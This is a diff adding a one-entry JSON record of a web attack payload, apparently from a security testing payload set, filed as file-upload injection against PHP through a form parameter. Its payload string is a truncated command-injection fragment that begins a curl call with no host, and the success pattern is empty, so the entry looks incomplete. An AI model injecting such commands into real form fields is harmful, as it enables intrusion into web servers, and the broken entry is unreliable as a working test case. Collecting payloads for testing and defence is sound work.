@@ -1,0 +1,13 @@
+[
+  {
+    "payload_id": "OWP-57724",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "\"curl -ks '",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
